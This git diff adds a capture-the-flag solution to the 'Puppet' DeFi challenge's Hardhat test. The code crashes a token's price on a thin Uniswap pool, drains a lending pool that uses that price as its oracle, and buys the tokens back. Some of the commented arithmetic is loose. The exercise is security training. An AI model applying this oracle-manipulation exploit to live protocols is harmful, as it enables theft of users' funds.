@@ -20,7 +20,7 @@ describe('[Challenge] Puppet', function () {
 
     const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
     const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
-    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')
+    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000');
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
@@ -31,7 +31,6 @@ describe('[Challenge] Puppet', function () {
         
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);
-        const PupperAttack = await ethers.getContractFactory('PuppetPool', attacker);
 
         await ethers.provider.send("hardhat_setBalance", [
             attacker.address,
@@ -61,12 +60,6 @@ describe('[Challenge] Puppet', function () {
             this.token.address,
             this.uniswapExchange.address
         );
-
-        // Deploy the PupperAttack
-        this.puppetAttack = await PupperAttack.deploy(
-            this.token.address,
-            this.lendingPool.address,
-            this.uniswapExchange);
 
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
@@ -109,11 +102,98 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
-        /* 1- Before the attack I have to transfer tokens from the attacker acounts to 
-        the contract accounts */
-        await this.token.transfer(this.puppetAttack.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-        this.puppetAttack.connect(attacker).attack(ethers.utils.parseEther("0.1"));
+        /** In the liquidity pool we have 10ETH : 10DVT which
+         *  is the equivalent of 1ETH = 1DVT, since the liquidity pool swaps between
+         * two tokens is calculated AFTER the deposit we'll have ""10ETH = 1010DVT""
+         * This means that we devaluted the DVT heavily because now ""1 ETH = 100DVT"""
+         * THE ONLY REASON WHY WE CAN MANIPULATE THE MARKET BECAUSE I HAVE MORE TOKENS THAN THE LIQUIDITY POOL HAS(ETH/DVT)
+        */
+        
+
+        // Connect to the contracts with the attackers wallet
+        const attackPuppet = this.lendingPool.connect(attacker);
+        const attackUniSwap = this.uniswapExchange.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+
+        // Helper function to get current token/eth balances
+        const logAttackerBalances = async (address, name) => {
+            const ethBal = await ethers.provider.getBalance(address);
+            const tokenBal =  await attackToken.balanceOf(address);
+
+            console.log(`ETH balance of ${name}: `, ethers.utils.formatEther(ethBal));
+            console.log(`Token balance of ${name}:`, ethers.utils.formatEther(tokenBal));
+            console.log("");
+
+        }
+
+        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(attackUniSwap.address, "uniswap");
+
+        // Approve token to swap with Uniswap
+        console.log("Approving the Inital Token Balance");
+        await attackToken.approve(attackUniSwap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        console.log("Balance Approved!");
+
+
+        // 1ETH = 1DVT token
+        // 10ETH = 1010 DVT token
+        // If I want to buy ETH against DVT the amount of DVT will decrease
+
+
+        // Check how much ETH we can get based on our TOKEN BALANCE
+        const ethPayout = await attackUniSwap.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, 
+            {
+                gasLimit: 1e6
+            });
+
+        console.log("Transfer of 1000 tokens will net", ethers.utils.formatEther(ethPayout)); 
+        
+        // Deposit DTV and swap it to devalute the DVT token
+        console.log("Transferring tokens for ETH");
+
+        await attackUniSwap.tokenToEthSwapInput(
+                            ATTACKER_INITIAL_TOKEN_BALANCE, // Exact amount og tokens to transfer
+                            ethers.utils.parseEther("9"), // Min return of 9 ETH
+                            (await ethers.provider.getBlock('latest')).timestamp * 2,     
+        );  
+
+        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(attackUniSwap.address, "uniswap");
+
+        // Deposit ETH required to gain ALL tokens from the pool
+        const deposit = await attackPuppet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        
+        console.log("Deposit required:", ethers.utils.formatEther(deposit));
+
+        // Empty the lending pool
+        await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, {value : deposit});
+
+        await logAttackerBalances(attacker.address, "attacker");
+
+        const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
+
+        const ethReq = await attackUniSwap.getEthToTokenOutputPrice(tokensToBuyBack,
+            {
+                gasLimit: 1e6
+            });
+        
+        console.log(`ETH required for ${tokensToBuyBack} tokens:`, ethers.utils.formatEther(ethReq));
+
+        // Get our original 1000 tokens back by swapping eth
+        await attackUniSwap.ethToTokenSwapOutput(
+            tokensToBuyBack,
+            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
+            {
+                value: ethReq,
+                gasLimit:1e6
+            }
+        );
+
+        console.log("****FINISHED****");
+        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(attackPuppet.address, "Lender");
+        await logAttackerBalances(attackUniSwap.address, "Uniswap");
+    
     });
 
     after(async function () {
